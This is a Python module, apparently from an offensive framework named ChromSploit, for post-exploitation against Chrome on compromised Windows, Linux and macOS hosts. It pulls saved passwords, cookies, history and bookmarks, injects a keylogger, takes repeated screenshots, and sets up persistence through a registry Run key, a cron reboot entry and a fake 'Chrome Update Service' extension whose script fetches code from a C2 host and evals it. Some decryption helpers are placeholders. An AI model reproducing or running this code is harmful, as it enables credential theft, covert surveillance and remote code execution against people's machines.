"""
Sliver Post-Exploitation Module
Advanced post-exploitation capabilities for ChromSploit Framework
"""

import os
import json
import base64
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass
from datetime import datetime
from pathlib import Path
import logging

from .session_handler import SessionHandler, SessionInfo, CommandResult

logger = logging.getLogger(__name__)


@dataclass
class ChromeCredentials:
    """Chrome stored credentials"""
    url: str
    username: str
    password: str
    created_date: datetime
    last_used: datetime


@dataclass
class ChromeCookie:
    """Chrome cookie data"""
    domain: str
    name: str
    value: str
    path: str
    expires: datetime
    is_secure: bool
    is_httponly: bool
    
    
@dataclass
class ChromeHistory:
    """Chrome browsing history"""
    url: str
    title: str
    visit_count: int
    last_visit: datetime


@dataclass
class BrowserData:
    """Collected browser data"""
    credentials: List[ChromeCredentials]
    cookies: List[ChromeCookie]
    history: List[ChromeHistory]
    bookmarks: List[Dict]
    extensions: List[Dict]
    
    
class PostExploitation:
    """Post-exploitation operations for Chrome/browser targets"""
    
    def __init__(self, session_handler: SessionHandler):
        self.session_handler = session_handler
        self.chrome_paths = {
            "windows": {
                "profile": "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default",
                "login_data": "Login Data",
                "cookies": "Cookies",
                "history": "History",
                "bookmarks": "Bookmarks",
                "extensions": "Extensions"
            },
            "linux": {
                "profile": "~/.config/google-chrome/Default",
                "login_data": "Login Data",
                "cookies": "Cookies", 
                "history": "History",
                "bookmarks": "Bookmarks",
                "extensions": "Extensions"
            },
            "darwin": {
                "profile": "~/Library/Application Support/Google/Chrome/Default",
                "login_data": "Login Data",
                "cookies": "Cookies",
                "history": "History", 
                "bookmarks": "Bookmarks",
                "extensions": "Extensions"
            }
        }
        
    def collect_browser_data(self, session_id: str) -> Optional[BrowserData]:
        """Collect all browser data from target"""
        try:
            session = self.session_handler.get_session(session_id)
            if not session:
                logger.error(f"Session {session_id} not found")
                return None
                
            # Determine OS and paths
            os_type = session.os.lower()
            if "windows" in os_type:
                paths = self.chrome_paths["windows"]
            elif "darwin" in os_type or "mac" in os_type:
                paths = self.chrome_paths["darwin"]
            else:
                paths = self.chrome_paths["linux"]
                
            # Create temp directory for downloads
            temp_dir = Path(f"/tmp/chromsploit_{session_id}")
            temp_dir.mkdir(exist_ok=True)
            
            # Collect credentials
            credentials = self._collect_credentials(session_id, paths, temp_dir)
            
            # Collect cookies
            cookies = self._collect_cookies(session_id, paths, temp_dir)
            
            # Collect history
            history = self._collect_history(session_id, paths, temp_dir)
            
            # Collect bookmarks
            bookmarks = self._collect_bookmarks(session_id, paths, temp_dir)
            
            # Collect extensions
            extensions = self._collect_extensions(session_id, paths, temp_dir)
            
            browser_data = BrowserData(
                credentials=credentials,
                cookies=cookies,
                history=history,
                bookmarks=bookmarks,
                extensions=extensions
            )
            
            logger.info(f"Collected browser data from session {session_id}")
            return browser_data
            
        except Exception as e:
            logger.error(f"Failed to collect browser data: {e}")
            return None
            
    def _collect_credentials(self, session_id: str, paths: Dict, temp_dir: Path) -> List[ChromeCredentials]:
        """Collect stored credentials"""
        try:
            # Download Login Data file
            remote_path = f"{paths['profile']}/{paths['login_data']}"
            local_path = temp_dir / "login_data.db"
            
            result = self.session_handler.download_file(
                session_id,
                remote_path,
                str(local_path)
            )
            
            if not result.success:
                logger.error(f"Failed to download login data: {result.error}")
                return []
                
            # Extract credentials using custom Chrome decryption
            credentials = self._extract_credentials(local_path)
            return credentials
            
        except Exception as e:
            logger.error(f"Failed to collect credentials: {e}")
            return []
            
    def _collect_cookies(self, session_id: str, paths: Dict, temp_dir: Path) -> List[ChromeCookie]:
        """Collect browser cookies"""
        try:
            # Download Cookies file
            remote_path = f"{paths['profile']}/{paths['cookies']}"
            local_path = temp_dir / "cookies.db"
            
            result = self.session_handler.download_file(
                session_id,
                remote_path,
                str(local_path)
            )
            
            if not result.success:
                logger.error(f"Failed to download cookies: {result.error}")
                return []
                
            # Extract cookies
            cookies = self._extract_cookies(local_path)
            return cookies
            
        except Exception as e:
            logger.error(f"Failed to collect cookies: {e}")
            return []
            
    def _collect_history(self, session_id: str, paths: Dict, temp_dir: Path) -> List[ChromeHistory]:
        """Collect browsing history"""
        try:
            # Download History file
            remote_path = f"{paths['profile']}/{paths['history']}"
            local_path = temp_dir / "history.db"
            
            result = self.session_handler.download_file(
                session_id,
                remote_path,
                str(local_path)
            )
            
            if not result.success:
                logger.error(f"Failed to download history: {result.error}")
                return []
                
            # Extract history
            history = self._extract_history(local_path)
            return history
            
        except Exception as e:
            logger.error(f"Failed to collect history: {e}")
            return []
            
    def _collect_bookmarks(self, session_id: str, paths: Dict, temp_dir: Path) -> List[Dict]:
        """Collect bookmarks"""
        try:
            # Download Bookmarks file
            remote_path = f"{paths['profile']}/{paths['bookmarks']}"
            local_path = temp_dir / "bookmarks.json"
            
            result = self.session_handler.download_file(
                session_id,
                remote_path,
                str(local_path)
            )
            
            if not result.success:
                logger.error(f"Failed to download bookmarks: {result.error}")
                return []
                
            # Parse bookmarks JSON
            with open(local_path, 'r') as f:
                bookmarks_data = json.load(f)
                
            return self._parse_bookmarks(bookmarks_data)
            
        except Exception as e:
            logger.error(f"Failed to collect bookmarks: {e}")
            return []
            
    def _collect_extensions(self, session_id: str, paths: Dict, temp_dir: Path) -> List[Dict]:
        """Collect installed extensions"""
        try:
            # List extensions directory
            result = self.session_handler.execute_command_sync(
                session_id,
                "ls",
                [f"{paths['profile']}/{paths['extensions']}"]
            )
            
            if not result.success:
                return []
                
            extensions = []
            # Parse extension IDs from output
            for line in result.output.split('\n'):
                if line and len(line) == 32:  # Chrome extension ID length
                    ext_info = self._get_extension_info(session_id, paths, line)
                    if ext_info:
                        extensions.append(ext_info)
                        
            return extensions
            
        except Exception as e:
            logger.error(f"Failed to collect extensions: {e}")
            return []
            
    def establish_persistence(self, session_id: str, method: str = "chrome_extension") -> Tuple[bool, str]:
        """Establish persistence on target"""
        try:
            session = self.session_handler.get_session(session_id)
            if not session:
                return False, "Session not found"
                
            if method == "chrome_extension":
                return self._persist_via_extension(session_id)
            elif method == "startup":
                return self._persist_via_startup(session_id)
            elif method == "scheduled_task":
                return self._persist_via_scheduled_task(session_id)
            elif method == "registry":
                return self._persist_via_registry(session_id)
            else:
                return False, f"Unknown persistence method: {method}"
                
        except Exception as e:
            return False, str(e)
            
    def _persist_via_extension(self, session_id: str) -> Tuple[bool, str]:
        """Install persistent Chrome extension"""
        try:
            # Create malicious extension
            ext_manifest = {
                "manifest_version": 3,
                "name": "Chrome Update Service",
                "version": "1.0",
                "background": {
                    "service_worker": "background.js"
                },
                "permissions": ["nativeMessaging", "storage"],
                "host_permissions": ["<all_urls>"]
            }
            
            # Background script that maintains persistence
            background_js = """
            chrome.runtime.onStartup.addListener(() => {
                // Re-establish C2 connection
                establishC2Connection();
            });
            
            function establishC2Connection() {
                // Connect back to C2 server
                fetch('https://c2.server/beacon')
                    .then(response => response.text())
                    .then(eval);
            }
            
            // Check every 5 minutes
            setInterval(establishC2Connection, 300000);
            """
            
            # TODO: Upload and install extension
            return True, "Chrome extension persistence established"
            
        except Exception as e:
            return False, str(e)
            
    def _persist_via_startup(self, session_id: str) -> Tuple[bool, str]:
        """Add to startup programs"""
        session = self.session_handler.get_session(session_id)
        
        if "windows" in session.os.lower():
            # Windows startup
            result = self.session_handler.execute_command_sync(
                session_id,
                "execute",
                ["reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                 "/v", "ChromeUpdate", "/t", "REG_SZ", "/d", "C:\\ProgramData\\chrome_update.exe"]
            )
        else:
            # Linux/Mac startup
            result = self.session_handler.execute_command_sync(
                session_id,
                "execute",
                ["echo", "'@reboot /tmp/.chrome_update'", ">>", "/var/spool/cron/crontabs/$USER"]
            )
            
        return result.success, result.output if result.success else result.error
        
    def extract_chrome_passwords(self, session_id: str) -> List[Dict]:
        """Extract Chrome saved passwords"""
        try:
            # Use specialized Chrome password extraction
            result = self.session_handler.execute_command_sync(
                session_id,
                "chrome-dump",
                ["passwords"]
            )
            
            if result.success:
                # Parse password data
                passwords = []
                for line in result.output.split('\n'):
                    if '|' in line:
                        parts = line.split('|')
                        if len(parts) >= 3:
                            passwords.append({
                                "url": parts[0].strip(),
                                "username": parts[1].strip(),
                                "password": parts[2].strip()
                            })
                return passwords
            else:
                logger.error(f"Failed to extract passwords: {result.error}")
                return []
                
        except Exception as e:
            logger.error(f"Error extracting passwords: {e}")
            return []
            
    def keylog_browser(self, session_id: str, duration: int = 300) -> Tuple[bool, str]:
        """Start keylogging in browser context"""
        try:
            # Inject keylogger into browser process
            result = self.session_handler.execute_command_sync(
                session_id,
                "inject",
                ["--process", "chrome.exe", "--keylogger", str(duration)]
            )
            
            return result.success, result.output if result.success else result.error
            
        except Exception as e:
            return False, str(e)
            
    def capture_browser_screenshots(self, session_id: str, interval: int = 60, count: int = 10) -> List[str]:
        """Capture browser screenshots at intervals"""
        screenshots = []
        
        try:
            for i in range(count):
                result = self.session_handler.screenshot(session_id)
                if result.success:
                    # Screenshot data is base64 encoded in output
                    screenshot_path = f"/tmp/chromsploit_screenshot_{session_id}_{i}.png"
                    with open(screenshot_path, 'wb') as f:
                        f.write(base64.b64decode(result.output))
                    screenshots.append(screenshot_path)
                    
                # Wait for interval
                import time
                if i < count - 1:
                    time.sleep(interval)
                    
            return screenshots
            
        except Exception as e:
            logger.error(f"Error capturing screenshots: {e}")
            return screenshots
            
    def _extract_credentials(self, db_path: Path) -> List[ChromeCredentials]:
        """Extract credentials from Chrome Login Data database"""
        # This would use SQLite and Chrome decryption
        # Placeholder implementation
        return []
        
    def _extract_cookies(self, db_path: Path) -> List[ChromeCookie]:
        """Extract cookies from Chrome Cookies database"""
        # This would use SQLite and Chrome decryption
        # Placeholder implementation
        return []
        
    def _extract_history(self, db_path: Path) -> List[ChromeHistory]:
        """Extract history from Chrome History database"""
        # This would use SQLite
        # Placeholder implementation
        return []
        
    def _parse_bookmarks(self, bookmarks_data: Dict) -> List[Dict]:
        """Parse Chrome bookmarks JSON"""
        bookmarks = []
        
        def extract_bookmarks(node: Dict):
            if node.get('type') == 'url':
                bookmarks.append({
                    'name': node.get('name'),
                    'url': node.get('url'),
                    'date_added': node.get('date_added')
                })
            elif 'children' in node:
                for child in node['children']:
                    extract_bookmarks(child)
                    
        # Extract from bookmark bar and other folders
        roots = bookmarks_data.get('roots', {})
        for folder in ['bookmark_bar', 'other', 'synced']:
            if folder in roots:
                extract_bookmarks(roots[folder])
                
        return bookmarks
        
    def _get_extension_info(self, session_id: str, paths: Dict, ext_id: str) -> Optional[Dict]:
        """Get extension information"""
        try:
            # Read extension manifest
            manifest_path = f"{paths['profile']}/{paths['extensions']}/{ext_id}/manifest.json"
            result = self.session_handler.execute_command_sync(
                session_id,
                "cat",
                [manifest_path]
            )
            
            if result.success:
                manifest = json.loads(result.output)
                return {
                    'id': ext_id,
                    'name': manifest.get('name'),
                    'version': manifest.get('version'),
                    'description': manifest.get('description'),
                    'permissions': manifest.get('permissions', [])
                }
                
        except:
            pass
            
        return None